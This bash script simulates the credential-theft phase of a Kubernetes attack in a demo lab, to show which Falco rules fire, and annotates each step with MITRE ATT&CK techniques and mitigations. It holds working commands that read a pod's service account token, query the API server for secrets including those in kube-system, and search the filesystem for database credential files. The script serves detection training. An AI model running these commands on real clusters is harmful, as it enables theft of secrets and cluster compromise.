#!/usr/bin/env bash
# ============================================================================
# ABOUTME: Attack simulation Phase 2 - Credential theft and secret access.
# ABOUTME: Demonstrates MITRE ATT&CK techniques T1552 and T1539 with Falco detection.
# ============================================================================
#
# ┌─────────────────────────────────────────────────────────────────────────┐
# │                    EDUCATIONAL SECURITY DEMONSTRATION                    │
# │                                                                          │
# │  This script simulates attacker behavior for EDUCATIONAL PURPOSES.      │
# │  It demonstrates techniques that security teams need to understand       │
# │  and detect. All actions are contained within a demo environment.       │
# └─────────────────────────────────────────────────────────────────────────┘
#
# PURPOSE:
#   Simulate the CREDENTIAL THEFT phase of an attack where the adversary
#   leverages discovered service account tokens to access Kubernetes secrets.
#   This is often the most damaging phase, as secrets typically contain:
#   - Database credentials
#   - API keys
#   - TLS certificates
#   - Cloud provider credentials
#
# ATTACK SCENARIO:
#   Building on Phase 1 reconnaissance, the attacker now:
#   1. Uses the service account token to authenticate to the API
#   2. Queries for secrets they can access
#   3. Attempts cross-namespace secret access
#   4. Searches for credential files in the filesystem
#
# ============================================================================
# MITRE ATT&CK MAPPING
# ============================================================================
#
# T1552 - Unsecured Credentials
#   Tactic: Credential Access
#   Description: Adversaries may search compromised systems to find and
#                obtain insecurely stored credentials.
#   Sub-techniques:
#     T1552.001 - Credentials in Files (service account tokens)
#     T1552.004 - Private Keys
#     T1552.007 - Container API (Kubernetes secrets)
#
# T1539 - Steal Web Session Cookie
#   Tactic: Credential Access
#   Description: Adversaries may steal web application cookies to gain
#                access. In Kubernetes context, this maps to stealing
#                bearer tokens used for API authentication.
#
# T1078.004 - Valid Accounts: Cloud Accounts
#   Tactic: Defense Evasion, Persistence, Privilege Escalation
#   Description: Using stolen credentials to access cloud resources.
#                Service account tokens are valid cloud credentials.
#
# ============================================================================
# FALCO RULES TRIGGERED
# ============================================================================
#
# The following Falco rules should detect this attack:
#
# 1. "Read Sensitive File Untrusted"
#    - Priority: WARNING
#    - Triggers: Reading service account token
#    - Output: Shows process and file path accessed
#
# 2. "Contact K8s API Server From Container"
#    - Priority: NOTICE
#    - Triggers: curl/wget to API server IP
#    - Why: Direct API calls are suspicious
#
# 3. "K8s Secret Read"
#    - Priority: CRITICAL
#    - Triggers: API call to /api/v1/secrets
#    - Why: Secret enumeration is high-severity
#
# 4. "Database Credential File Access"
#    - Priority: WARNING
#    - Triggers: Reading .pgpass, .my.cnf, etc.
#    - Why: These files contain database credentials
#
# 5. "Sensitive File Access by Non-Privileged Process"
#    - Priority: WARNING
#    - Triggers: Non-root accessing sensitive paths
#    - Why: Credential file access should be rare
#
# ============================================================================
# DETECTION INDICATORS
# ============================================================================
#
# Security teams should look for:
#   - API calls from container to kubernetes.default.svc
#   - Requests to /api/v1/secrets or /api/v1/namespaces/*/secrets
#   - curl/wget commands in containers
#   - Bearer token usage in HTTP headers
#   - Find commands looking for credential patterns
#   - Access to .pgpass, .my.cnf, credentials.json, etc.
#
# ============================================================================
# REAL-WORLD IMPACT
# ============================================================================
#
# In a real attack, stolen secrets could lead to:
#   - Database compromise (stolen DB credentials)
#   - Cloud account takeover (stolen cloud keys)
#   - Lateral movement to other systems
#   - Data exfiltration
#   - Ransomware deployment
#
# This is why RBAC must follow least privilege - the vulnerable app
# should NEVER have cluster-wide secret read access.
#
# ============================================================================
# SAFETY NOTES
# ============================================================================
#
# This script:
#   - Only runs inside the vulnerable-app container
#   - Only READS secrets (no modification)
#   - Does not exfiltrate data outside the cluster
#   - Truncates output to prevent full secret exposure
#   - Should only be run in isolated demo environments
#
# ============================================================================

set -euo pipefail

# Configuration
NAMESPACE="vulnerable-app"
APP_LABEL="app=vulnerable-app"

# Terminal colors
BOLD='\033[1m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m'

# ============================================================================
# SCRIPT HEADER
# ============================================================================
echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Phase 2: Credential Theft${NC}"
echo -e "${BOLD}  MITRE ATT&CK: T1552, T1539${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""

# ============================================================================
# TARGET POD IDENTIFICATION
# ============================================================================
POD=$(kubectl get pod -n "${NAMESPACE}" -l "${APP_LABEL}" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
if [[ -z "${POD}" ]]; then
    echo -e "${RED}ERROR: No vulnerable-app pod found in namespace ${NAMESPACE}${NC}"
    exit 1
fi

echo -e "${GREEN}Target pod: ${POD}${NC}"
echo ""

# ============================================================================
# STEP 1: EXTRACT SERVICE ACCOUNT TOKEN
# ============================================================================
# TECHNIQUE: T1552.001 - Credentials in Files
#
# ATTACK DETAILS:
#   The service account token is a JWT (JSON Web Token) that contains:
#   - iss: Token issuer (kubernetes/serviceaccount)
#   - sub: Subject (system:serviceaccount:namespace:name)
#   - aud: Audience (https://kubernetes.default.svc.cluster.local)
#   - exp: Expiration time
#
#   This token can be used in the Authorization header to authenticate
#   API requests with the service account's permissions.
#
# WHY THIS WORKS:
#   By default, Kubernetes mounts the service account token into every
#   pod at /var/run/secrets/kubernetes.io/serviceaccount/token. Unless
#   automountServiceAccountToken: false is set, all pods have this.
#
# MITIGATION:
#   - Set automountServiceAccountToken: false on pods that don't need it
#   - Use short-lived tokens via TokenRequest API
#   - Implement pod security standards that enforce this
# ============================================================================
echo -e "${YELLOW}[1/4] Extracting service account token for API access...${NC}"
echo ""
TOKEN=$(kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token')
echo "  Token extracted (first 50 chars): ${TOKEN:0:50}..."
echo ""
sleep 2

# ============================================================================
# STEP 2: QUERY KUBERNETES API FOR SECRETS
# ============================================================================
# TECHNIQUE: T1552.007 - Container API
#
# ATTACK DETAILS:
#   Using the stolen token, the attacker makes API calls to:
#   1. List all secrets they can access
#   2. Get specific secret contents
#   3. Enumerate permissions
#
# HOW THE API CALL WORKS:
#   - APISERVER: kubernetes.default.svc (internal DNS name)
#   - Authorization: Bearer <token> (the stolen JWT)
#   - Endpoint: /api/v1/secrets (list all accessible secrets)
#
# WHAT SECRETS MIGHT CONTAIN:
#   - Database passwords
#   - API keys (Stripe, Twilio, AWS)
#   - TLS private keys
#   - OAuth client secrets
#   - Encryption keys
#
# FALCO DETECTION:
#   Rule: "K8s Secret Read" or custom rule for API secret access
#   Priority: CRITICAL
#   Why: Unauthorized secret access is a high-severity event
#
# The ?limit=3 parameter is for demo purposes - a real attacker would
# enumerate all secrets.
# ============================================================================
echo -e "${YELLOW}[2/4] Querying Kubernetes API for secrets... (triggers Falco)${NC}"
echo -e "  Command: curl -sk https://\$KUBERNETES_SERVICE_HOST/api/v1/secrets"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/secrets?limit=3" 2>/dev/null | head -20 || echo "  (API response truncated or access denied)"
'
echo ""
sleep 2

# ============================================================================
# STEP 3: CROSS-NAMESPACE SECRET ACCESS
# ============================================================================
# TECHNIQUE: T1552.007 + Privilege Escalation
#
# ATTACK DETAILS:
#   The vulnerable app has a ClusterRole that grants secrets access
#   across ALL namespaces. This is the key vulnerability we're
#   demonstrating - overly permissive RBAC.
#
# WHY KUBE-SYSTEM IS TARGETED:
#   The kube-system namespace contains critical secrets:
#   - etcd encryption keys
#   - Cloud provider credentials
#   - Cluster CA certificates
#   - Service account tokens for system components
#
#   Accessing these secrets could lead to complete cluster compromise.
#
# PROPER RBAC:
#   Service accounts should ONLY have:
#   - Access to their own namespace (Role, not ClusterRole)
#   - Specific resources they need (not wildcards)
#   - Minimal verbs (get specific secrets, not list all)
#
# Example of overly permissive (BAD) RBAC:
#   rules:
#   - apiGroups: [""]
#     resources: ["secrets"]
#     verbs: ["get", "list"]  # No resourceNames restriction!
# ============================================================================
echo -e "${YELLOW}[3/4] Listing secrets across namespaces... (triggers Falco)${NC}"
echo -e "  Command: curl -sk https://\$KUBERNETES_SERVICE_HOST/api/v1/namespaces/kube-system/secrets"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -sk --max-time 5 \
    -H "Authorization: Bearer ${TOKEN}" \
    "${APISERVER}/api/v1/namespaces/kube-system/secrets?limit=3" 2>/dev/null | head -20 || echo "  (API response truncated or access denied)"
'
echo ""
sleep 2

# ============================================================================
# STEP 4: FILESYSTEM CREDENTIAL SEARCH
# ============================================================================
# TECHNIQUE: T1552.001 - Credentials in Files
#
# ATTACK DETAILS:
#   Attackers search for common credential file patterns:
#   - .pgpass: PostgreSQL password files
#   - .my.cnf: MySQL configuration with credentials
#   - database.yml: Rails database configuration
#   - db.properties: Java database properties
#   - connectionstring*: Various connection string files
#   - credentials.json: Google Cloud credentials
#   - .aws/credentials: AWS credentials
#
# WHY CREDENTIALS END UP IN CONTAINERS:
#   - Developers mount config files for convenience
#   - Legacy applications expect file-based credentials
#   - Improper use of ConfigMaps instead of Secrets
#   - Credentials baked into images (very bad!)
#
# FALCO DETECTION:
#   Rule: "Database Credential File Access"
#   Priority: WARNING
#   Triggers: find/ls/cat commands targeting credential patterns
#
# MITIGATION:
#   - Use Kubernetes Secrets with proper RBAC
#   - Use secret management systems (Vault, Azure Key Vault)
#   - Scan images for embedded credentials
#   - Use environment variables or mounted secrets, not files
# ============================================================================
echo -e "${YELLOW}[4/4] Searching for credential files... (triggers Falco)${NC}"
echo -e "  Command: find / -name '*.pgpass' -o -name '*.my.cnf' -o -name 'database.yml'"
echo ""
kubectl exec -n "${NAMESPACE}" "${POD}" -- sh -c '
  find / -maxdepth 4 \
    \( -name "*.pgpass" -o -name ".my.cnf" -o -name "database.yml" \
       -o -name "db.properties" -o -name "connectionstring*" \) \
    2>/dev/null || echo "  No credential files found (but the search triggered Falco)"
'
echo ""

# ============================================================================
# CREDENTIAL THEFT SUMMARY
# ============================================================================
echo -e "${BOLD}========================================${NC}"
echo -e "${BOLD}  Credential Theft Simulation Complete${NC}"
echo -e "${RED}  Check Falco logs for CRITICAL alerts!${NC}"
echo -e "${BOLD}========================================${NC}"
echo ""
echo -e "View Falco alerts: kubectl logs -n falco -l app.kubernetes.io/name=falco -f --since=2m"
